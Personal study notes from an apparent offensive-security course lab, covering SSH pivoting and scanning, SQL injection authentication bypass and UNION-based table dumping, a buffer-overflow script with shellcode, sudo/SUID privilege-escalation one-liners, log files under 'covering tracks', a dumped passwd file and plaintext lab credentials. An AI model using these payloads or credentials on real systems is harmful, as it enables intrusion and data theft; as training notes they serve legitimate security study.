OSCP course - pen test gold standard certification
MY LINUX IP - 10.50.179.45
Windows IP - 10.50.179.48
223/265

USERNAME: JUDU-021-M
PASSWORD: fawskB5s0FnC
JUMP-BOX IP: 10.50.16.38
CTFD SERVER: http://10.50.178.176:8000/
xfreerdp /v:127.0.0.1:YYYY /u:student /p:password /size:1920x1000 +clipboard

Danny Phantom
Chesty Puller
AM

**SCANNING AND RECONNAISSANCE**
- LIN-OPS: ssh -MS /tmp/jump student@10.50.16.38
- JUMP: for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
        
        64 bytes from 192.168.28.97: icmp_seq=1 ttl=64 time=0.192 ms
        64 bytes from 192.168.28.100: icmp_seq=1 ttl=63 time=1.68 ms
        64 bytes from 192.168.28.105: icmp_seq=1 ttl=63 time=1.86 ms
        64 bytes from 192.168.28.111: icmp_seq=1 ttl=63 time=1.72 ms
        64 bytes from 192.168.28.120: icmp_seq=1 ttl=63 time=2.03 ms

- LIN-OPS: ssh -S /tmp/jump jump -O forward -D9050
       
        Nmap scan report for 192.168.28.100
        Host is up (0.00094s latency).
        Not shown: 998 closed ports
        PORT     STATE SERVICE
        80/tcp   open  http ## VERIFIED HTTP
        2222/tcp open  EtherNetIP-1 ## VERIFIED SSH 

        Nmap scan report for 192.168.28.105
        Host is up (0.00086s latency).
        Not shown: 997 closed ports
        PORT     STATE SERVICE
        21/tcp   open  ftp ## VERIFIED FTP
        23/tcp   open  telnet ## VERIFIED TELNET
        2222/tcp open  EtherNetIP-1 ## VERIFIED SSH

        Nmap scan report for 192.168.28.111
        Host is up (0.0015s latency).
        Not shown: 997 closed ports
        PORT     STATE SERVICE
        80/tcp   open  http
        2222/tcp open  EtherNetIP-1
        8080/tcp open  http-proxy

- proxychains nc 192.168.28.100 80 ##VERIFIY ALL PORTS/HOSTS

## SET UP PORT FORWARDING
- ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L 1112 192.168.28.100:2222 -L 2111:192.168.28.105:2222

- ssh -S /tmp/jump jump -O cancel -L 1111:192.168.28.100:80
        (if error, ss -ntlp)

######################################################################################################################

- ssh -MS /tmp/t1 username@127.0.0.1 -p 1112

- ssh -S /tmp/jump jump -O cancel -D9050 ##CANCELLING OLD DYNAMIC JUMP SOCKET

- ssh -S /tmp/t1 t1 -O forward -D9050

- proxychains nmap 192.168.28.150,128

- proxychains nc 192.168.150.128 80

- proxychains nc 192.168.150.128 22

- ssh -S /tmp/t1 t1 -O forward -L 3111:192.168.150.128:80 -L 3112 192.168.150.128:22 

- ssh -MS /tmp/t2 username@127.0.0.1 -p 3112

ls -l /usr/share/nmap/scripts | grep nse
proxychains nmap --script=http-enum 192.168.28.100

for i in {129..158}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done

#########################################################################################################################
#                                                      DAY 3                                                            # 
#                                          SQL: STRUCTURED QUERY LANGUAGE                                               #                                                                                                                #
#########################################################################################################################
------------------------------------------------
https://www.w3schools.com/SQL/sql_syntax.asp
------------------------------------------------

***********************--DEMO - SQL INJECTION--********************************************************
                         AUTHENTICATION BYPASS

ssh demo1@10.50.15.172 -L 1111:10.208.50.61:80
> Username: 'OR 1='1
> Password: 'OR 1='1

OR

F12 > Network Tab
> Username: 'OR 1='1
> Password: 'OR 1='1
Click Method: Post > Request on Right Pane > Toggle Raw data
Copy, add to url as a variable by adding a ?
********************************************************************************************************

****************************--DEMO - DATABASE INTERACTIONS--********************************************
mysql
##GOLDEN STATEMENT
select table_schema,table_name,column_name from information_schema.columns ;
       <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN> from <NAME OF DATABASE>.<NAME OF TABLE>
use information_schema ;
show.tables ;
show columns from columns ;
                     ^
                   table
select tireid,name,size from session.Tires ;
select username,passwd from session.userinfo ;
select carid,size,type,cost,color,year from session.car ;
select Audi' UNION SELECT 1,2,3,4 #  ## ERROR
select Audi' UNION SELECT 1,2,3,4,5 #
********************************************************************************************************

*************************************-- POST METHOD --**************************************************
## 1. Identify vulnerable field //selection
Ford' OR 1-'1 ## Not vulnerable
..
..
Audi' OR 1='1 ## Vulnerable

## 2. Identify number of columns/selections
Audi' UNION SELECT 1,2,3,4,5 #

## 3. Modify Golden Statement
Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #

## 4. Craft Queries
Audi' UNION SELECT tireid,2,name,size,cost from session.Tires #
***********************************************************************************************************

********-- GET METHOD --***********************************************************************************
1. Identify vulnerable fields/selection
Selection=1 OR 1-1 ##Not vulnerable
Selection=2 OR 1=1 Vulnerable (2,3,4 all vulnerable)

##2. Identify number of columns
Selection=2 UNION SELECT 1,2,3 ## Displayed 1,3,2

##3. Modify golden statement
Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns

##4. Craft Queries 
Selection=2 UNION SELECT start,status, last_access from session.session_log
Selection=2 UNION SELECT id,name,pass from session.user
***********************************************************************************************************
                                 vvvvv Random shit that will apparently gt me a CTF vvvvv
php?key=<value> || UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'

UNION SELECT 1,2,@@version - extract version number

UNION SELECT 1,table_name,3 from information_schema.tables where table+schema=database()

##DEFAULT DATABASES
information_schema
performance_schema
mysql


#########################################################################################################################
##                                                     DAY 4                                                           ## 
##                                              Reverse Engineering                                                    ##                                                                                                                #
#########################################################################################################################


X86_64 Assembly - Common Instruction Pointers

===========================================================================================================================
|MOV  |  move source to destination                                                                                       |
===========================================================================================================================
|PUSH |  push source onto stack                                                                                           |
===========================================================================================================================
|POP  |  Pop top of stack to destination                                                                                  |
===========================================================================================================================
|INC  |  Increment source by 1                                                                                            |
===========================================================================================================================
|DEC  |  Decrement source by 1                                                                                            |
===========================================================================================================================
|ADD  |  Add source to destination                                                                                        |
===========================================================================================================================
|SUB  |  Subtract source from destination                                                                                 |
===========================================================================================================================
|CMP  |  Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.     |
===========================================================================================================================
|JMP  |  Jump to specified location                                                                                       |
===========================================================================================================================
|JLE  |  Jump if less than or equal                                                                                       |
===========================================================================================================================
|JE   |  Jump if equal                                                                                                    |
===========================================================================================================================


===========================================================================================================================
|%rax  |  the first return register                                                                                       |
===========================================================================================================================
|%rbp  |  the base pointer that keeps track of the base of the stack                                                      |
===========================================================================================================================
|%rsp  |  the stack pointer that points to the top of the stack                                                           |
===========================================================================================================================



----------------------------------------------------------------------------------------------------------------------------
main 
        mov rax, 16        //move value 16 to rax
        push rax           //push value of rax (16) onto the stack
        jmp mem2           //jump to mem2 location     
mem1
        mov rax, 8         //move the value of 8 to rax
        ret                //return, no further instructions, terminate program
mem2
        pop r8             //pop top of stack to r8
        cmp rax, r8        //compare rax (16) to r8 (16). Values equal, zero flag set
        je mem1            //jump if equal to mem1 location
----------------------------------------------------------------------------------------------------------------------------
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int firstKey(key1)
{
    int key2 = atoi(key1);          // makes key2 and sets the value to key1, converting to integer if ASCII
	int p2 = 29;                    // declares integer p2 and sets it to 29
    if ((key2-123)==0)              // if key2 is equal to 123
    {
        return 13555;               // output '13555'
    }
    return 12;                      // output '12'
}

int main(void) 
{
    char key1[20];                  // creates an array of characters t
    printf("Enter Key: ");          // prints 'Enter Key:' to the screen
    fgets(key1,20,stdin);           //
    strtok(key1, "\n");             //
    if (firstKey(key1)==13555)      // calls the firstKey function, giving it the key1 array as a variable, then checks if output is equal to 13555
    {
        printf("Success!!.\n");     // prints 'Success!!' to the screen, kicks down to a new line
	    Sleep(5000);                // waits 5 seconds
		return 0;                   // terminates the program
    }
    else
    {
        printf("Failed!!.\n", key1); // prints 'Failed!!' to the screen and kicks down to a new line
	    Sleep(5000);                 // waits 5 seconds
		return 0;                    // terminates the program
    }
}
----------------------------------------------------------------------------------------------------------------------------

#########################################################################################################################
##                                                     DAY 5                                                           ## 
##                                              Exploit Developnent                                                    ##                                                                                                                #
#########################################################################################################################

Installation of peda plugin
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

Common peda Commands
disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point

---------------------------------------------------------------------------------------------------------------------------------
## STATIC ANALYSIS
strings <program> | head
file <program> (ELF means exe)

## BEHAVIORAL ANALYSIS
chmod u+x func

# DYNAMIC ANALYSIS
## FUZZING
./func $(echo "12345678") ##pass arguments
./func <<<$(echo "12345678") ##simulates user input
./func <<<$(echo "<bunch of random shit>")

## DISASSEMBLY
gdb ./func
shell > exit
quit ##break out of gdb

info functions

run or start

disass or pdisass main ## pdisass other functions

python spaghetti.py

print offset

run <<<$(python spaghetti.py)

do some shit where you go to wiremask.eu and tools > buffer overflow randomizer > and put in 100 and run it. After that it should tell you the address of EIP and you 
gotta plug that into the offset field to get the exact address required to trigger the overflow. After that you may plug that into the offset field in your python script to do the thing.

**-------------------------------**SCRIPT**----------------------------------------**
#!/usr/bin/env python
offset = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 10
buf =  b""
buf += b"\xd9\xc2\xd9\x74\x24\xf4\xbd\x4d\x78\xe0\xdd\x58"
buf += b"\x33\xc9\xb1\x0b\x31\x68\x19\x83\xe8\xfc\x03\x68"
buf += b"\x15\xaf\x8d\x8a\xd6\x77\xf7\x19\x8f\xef\x2a\xfd"
buf += b"\xc6\x08\x5c\x2e\xaa\xbe\x9d\x58\x63\x5c\xf7\xf6"
buf += b"\xf2\x43\x55\xef\x02\x83\x5a\xef\x7b\xeb\x35\x8e"
buf += b"\xee\x82\xc9\x07\xa2\xdd\x2b\x6a\xc4"
print (offset+eip+nop+buf)

#offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
# Setup GDB environment and Find jmp esp addresses
'''
shell 
env - gdb ./func
show env 
unset env COLUMNS
unset env LINES
run and ctrl+c or start
info proc map
'''
# grab first address after heap, last address before stack
# 0xf7de1000 0xf7ffe000
# find /b 0xf7de1000, 0xf7ffe000, 0xff, 0xe4
'''
PLACE LITTLE ENDIAN CONVERSION IN EIP
0xf7|de|3b|59 > \x59\x3b\xde\xf7 
0xf7|f5|88|ab > \xab\x88\xf5\xf7
0xf7|f6|45|fb > \xfb\x45\xf6\xf7
'''
# msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python

**----------------------------------------------------------------------------------**
192.168.28.100 www-data
80
	- /admin
		-admin/login.php
	-/img
2222
/home/comrade/Dekstop/network/map.png /home/student

INTERNAL: 192.168.X.0/27

192.168.150.253 - 80,514,3201 (11203:80, 11204:3201)

**----------------------------------------------------------------------------------**
GTFO Bins: https://gtfobins.github.io/gtfobins/tcpdump/

sudoers manpage: https://linux.die.net/man/5/sudoers

SUDO configuration: https://wiki.archlinux.org/index.php/sudo#Configuration

Dangerous commands: https://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/

|--------------------------------------------|
| Red Team Field Manual                      |
| Linux/Unix Administrator Handbook          |
| Cyber War                                  |
|--------------------------------------------|

**----------------------------------------------------------------------------------**
WAYS TO FIGURE OUT INIT TYPE

ls -latr /proc/1/exe
stat /sbin/init
man init
init --version
ps 1

AUDITING SYSTEMV

ausearch -p 22
ausearch -m USER_LOGIN -sv no
ausearch -ua edwards -ts yesterday -te now -i

COMMANDS FOR COVERING TRACKS

auth.log/secure -Logins/authentications
lastlog -Each users' last successful login time
btmp -Bad login attempts
sulog -Usage of SU command
utmp -Currently logged in users (W command)
wtmp -Permanent record on user on/off

RSYSLOG
Newer Rsyslog references: /etc/rsyslog.d/* for settings/rules
Older version only uses: /etc/rsyslog.conf

Find out
grep "IncludeConfig" /etc/rsyslog.conf
xfreerdp /u:<USER> /p:<PASS> /v:<IP>

------------------------## PRIVESC DEMO NOTES ##-------------------------------------

# SUDO DEMO

# LIST SUDO PERMISSIONS

sudo -l
// checked GTFOBins found this
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

## SUID/SGID

# SUID
find / -type f -perm /4000 -ls 2>/dev/null
##SGID 
find / -type f -perm /2000 -ls 2>/dev/null
##BOTH
find / -type f -perm /6000 -ls 2>/dev/null

/home/demo1/nice /bin/sh -p

## . in PATH

echo $PATH
PATH=.:$PATH //adds pwd to the PATH variable

#!/bin/bash
<SCRIPT>






















4 types of enumeration:
services
users
network
process


root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin 
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin 
syslog:x:102:106::/home/syslog:/usr/sbin/nologin 
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin 
lxd:x:105:65534::/var/lib/lxd/:/bin/false 
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin 
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin 
pollinate:x:110:1::/var/cache/pollinate:/bin/false 
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash 
comrade:x:1001:1001::/home/comrade:/bin/bash 













































